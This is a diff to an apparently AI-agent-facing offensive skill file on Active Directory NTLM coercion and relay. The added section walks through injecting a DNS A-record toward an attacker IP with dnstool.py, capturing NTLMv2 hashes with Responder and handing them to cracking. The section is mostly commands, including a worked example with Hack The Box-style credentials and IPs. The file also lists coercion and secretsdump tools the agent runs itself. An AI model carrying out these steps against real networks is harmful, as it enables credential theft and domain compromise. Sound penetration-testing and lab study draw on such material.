@@ -27,6 +27,10 @@ keywords:
   - hash capture
   - authentication coercion
   - forced authentication
+  - dns record injection
+  - dnstool
+  - scheduled task callback
+  - UseDefaultCredentials
 tools:
   - ntlmrelayx.py
   - krbrelayx.py
@@ -35,6 +39,7 @@ tools:
   - PetitPotam
   - DFSCoerce
   - netexec
+  - dnstool.py
 opsec: high
 ---
 
@@ -118,6 +123,7 @@ and must be handed off to the user for manual execution:
 
 **Non-privileged commands** Claude can execute directly:
 - Coercion tools: `PetitPotam.py`, `DFSCoerce.py`, `printerbug.py`, `ShadowCoerce`, `CheeseOunce`
+- DNS record injection: `dnstool.py` (krbrelayx — uses LDAP, no raw sockets)
 - Enumeration: `netexec smb --gen-relay-list`, `certipy find`, `bloodyAD`
 - Kerberos auth setup: `getTGT.py`, `export KRB5CCNAME`
 - Post-relay exploitation: `getST.py`, `secretsdump.py`, `certipy auth`
@@ -194,6 +200,7 @@ WebClient converts SMB UNC paths to HTTP, enabling coercion over HTTP
 | WebClient enabled on target | HTTP coercion -> relay to LDAP | Step 3 + Step 4B |
 | Kerberos relay viable | Coercion -> Kerberos relay to AD CS | Step 3 + Step 5 |
 | No relay feasible | Capture hashes -> crack offline | Step 6 |
+| Scheduled task resolves attacker-controlled DNS with NTLM | DNS record injection -> capture | Step 3B + Step 6 |
 | On same VLAN, no creds | LLMNR/NBNS poisoning -> capture | Step 7 |
 
 ## Step 3: Authentication Coercion
@@ -263,6 +270,124 @@ python3 shadowcoerce.py -u user -p password -d DOMAIN.LOCAL \
 # If you have MSSQL access
 EXEC xp_dirtree '\\LISTENER_IP\share', 1, 1
 EXEC master.dbo.xp_fileexist '\\LISTENER_IP\share\file'
+```
+
+### Step 3B: DNS Record Injection (Scheduled Task / Script Callback)
+
+When a scheduled task or service script resolves attacker-controllable DNS
+names and authenticates with NTLM (e.g., PowerShell `Invoke-WebRequest`
+with `-UseDefaultCredentials`), inject a DNS A-record pointing to the
+attacker and capture the callback.
+
+**When to use:** Discovery finds a script or scheduled task that:
+- Resolves DNS names matching a pattern (e.g., `web*`, `monitor*`)
+- Authenticates with NTLM (`-UseDefaultCredentials`, `net use`, UNC paths)
+- Runs as a privileged user (service account, admin, etc.)
+
+**Common examples:** monitoring scripts, health check scripts, backup
+scripts that connect to hosts by DNS name.
+
+**Requirements:**
+- Domain user credentials (default AD permissions allow creating DNS records)
+- `dnstool.py` from the [krbrelayx](https://github.com/dirkjanm/krbrelayx)
+  toolkit (handles AD DNS binary format correctly)
+- Responder or other NTLM capture tool
+
+#### 1. Add DNS A-Record
+
+Use `dnstool.py` from krbrelayx — it handles the `dnsRecord` binary
+attribute format correctly. **Do NOT craft the binary record manually** —
+the format includes zone serial number, TTL byte order, and timestamp
+fields that must match the zone's SOA record. Manual crafting is the
+most common failure mode for this technique.
+
+```bash
+# Add A-record pointing to attacker IP
+# -u: domain user creds (NTLM auth — no Kerberos needed)
+# -a add: add a new record
+# -r: record name (must match the pattern the script resolves)
+# -d: IP address to point to (attacker)
+# -t A: record type (A = IPv4 address)
+python3 dnstool.py -u 'DOMAIN.LOCAL\user' -p 'password' DC_IP \
+  -a add -r 'RECORDNAME.DOMAIN.LOCAL' -d ATTACKER_IP -t A
+
+# Example: script resolves web*.intelligence.htb
+python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' \
+  -p 'NewIntelligenceCorpUser9876' 10.129.1.166 \
+  -a add -r 'webpwned.intelligence.htb' -d 10.10.14.67 -t A
+```
+
+If `dnstool.py` is not installed, clone krbrelayx:
+```bash
+git clone https://github.com/dirkjanm/krbrelayx.git
+python3 krbrelayx/dnstool.py ...
+```
+
+#### 2. Verify DNS Resolution
+
+**Critical step — do not skip.** Confirm the DC's DNS server actually
+serves the record, not just that it exists in LDAP. AD-integrated DNS
+can have records in LDAP that DNS ignores (wrong binary format, wrong
+container, stale zone transfer).
+
+```bash
+# Query the DC's DNS server directly
+dig @DC_IP RECORDNAME.DOMAIN.LOCAL A +short
+
+# Or with nslookup
+nslookup RECORDNAME.DOMAIN.LOCAL DC_IP
+```
+
+**Expected:** Returns attacker IP.
+**If NXDOMAIN:** See Troubleshooting → "DNS Record in LDAP but Not Served."
+
+#### 3. Start Listener
+
+Start Responder (privileged — use `start_process` with `privileged: true`
+for shell-server, or hand off to operator):
+
+```bash
+# Responder in capture mode on the correct interface
+sudo responder -I tun0 -v
+
+# Or minimal — HTTP only (if script uses HTTP)
+sudo responder -I tun0 -v
+```
+
+**Port conflicts:** If port 80 or 445 is already in use, stop the
+conflicting service first. Responder will fail silently if it can't bind.
+
+#### 4. Wait for Callback
+
+The script runs on its schedule (typically every 1–15 minutes). Monitor
+Responder output for NTLMv2 hashes. Allow at least **two full cycles**
+before concluding the technique failed.
+
+```
+[HTTP] NTLMv2 Client   : 10.10.10.5
+[HTTP] NTLMv2 Username : DOMAIN\ServiceUser
+[HTTP] NTLMv2 Hash     : ServiceUser::DOMAIN:challenge:response:blob
+```
+
+#### 5. Save and Return
+
+Save the hash and return to the orchestrator:
+```bash
+# Copy hash from Responder logs
+cp /usr/share/responder/logs/HTTP-NTLMv2-*.txt \
+  engagement/evidence/<username>-ntlmv2-hash.txt
+```
+
+Return with: hash file path, hashcat mode 5600, source username,
+routing recommendation to **credential-cracking**.
+
+#### Cleanup
+
+After capturing the hash, remove the injected DNS record:
+
+```bash
+python3 dnstool.py -u 'DOMAIN.LOCAL\user' -p 'password' DC_IP \
+  -a remove -r 'RECORDNAME.DOMAIN.LOCAL' -t A
 ```
 
 ## Step 4: NTLM Relay
@@ -630,6 +755,44 @@ Default `ms-DS-MachineAccountQuota` is 10. If set to 0:
 - Cannot create machine accounts via relay
 - Use `--delegate-access` instead (modifies existing object)
 - Or relay to AD CS for certificate-based escalation
+
+### DNS Record in LDAP but Not Served
+
+The record appears in LDAP (`ldapsearch` shows it in `DomainDnsZones`) but
+`dig @DC_IP` returns NXDOMAIN. Causes:
+
+1. **Wrong binary format** — the `dnsRecord` attribute uses a Microsoft-
+   specific binary encoding with zone serial, TTL, and timestamp fields.
+   If any field is malformed, the DNS server ignores the record silently.
+   **Fix:** Use `dnstool.py` from krbrelayx — it reads the zone SOA to
+   get the correct serial number and constructs valid binary blobs. Never
+   craft the binary record manually via `ldapmodify` or Python LDAP.
+
+2. **Wrong container** — AD DNS records live under
+   `DC=<zone>,CN=MicrosoftDNS,DC=DomainDnsZones,DC=<domain>,...`.
+   Records placed elsewhere (e.g., under `CN=MicrosoftDNS,CN=System`)
+   are not served by the DNS server. `dnstool.py` uses the correct
+   container by default.
+
+3. **DNS cache / zone transfer delay** — AD-integrated DNS zones update
+   from LDAP, but there can be a brief delay. Wait 30–60 seconds and
+   retry `dig`. If it still fails after 2 minutes, the binary format
+   is likely wrong.
+
+4. **Record name collision** — if a record with the same name already
+   exists (including tombstoned records), the add may silently fail or
+   create a duplicate that DNS ignores. Check for existing records:
+   ```bash
+   python3 dnstool.py -u 'DOMAIN\user' -p 'pass' DC_IP \
+     -a query -r 'RECORDNAME.DOMAIN.LOCAL' -t A
+   ```
+   If a stale record exists, remove it first with `-a remove`, then re-add.
+
+**If `dnstool.py` itself fails** (connection error, access denied):
+- Verify the user has domain user privileges (default allows DNS record
+  creation in `DomainDnsZones`)
+- Check LDAP connectivity: `ldapsearch -H ldap://DC_IP -x -b "" -s base`
+- Clock skew can affect the LDAP bind — sync clock if needed
 
 ### KRB_AP_ERR_SKEW (Clock Skew)
 
